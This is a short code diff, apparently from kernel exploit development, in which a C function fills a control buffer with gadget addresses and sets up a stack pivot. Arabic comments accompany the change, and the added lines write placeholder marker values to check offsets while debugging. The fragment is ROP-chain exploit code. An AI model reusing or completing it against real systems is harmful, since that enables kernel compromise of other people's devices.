@@ -94,6 +94,10 @@ int _main(struct thread *td) {
     for (int i = 0x50; i < 0xA0; i += 8) {
         *(uintptr_t *)(control_buf + i) = step2;
     }
+    // جرب إضافة هذا السطر مؤقتاً للتأكد
+    *(uintptr_t *)(control_buf + 0x60) = 0xBBBBBBBBBBBBBBBB; 
+    *(uintptr_t *)(control_buf + 0x68) = 0xCCCCCCCCCCCCCCCC;
+
 
     // !!! الـ Stack Pivot: تحويل الـ RSI إلى مكدس (Marker C) !!!
     *(uintptr_t *)(control_buf + 0x3b) = step3; 
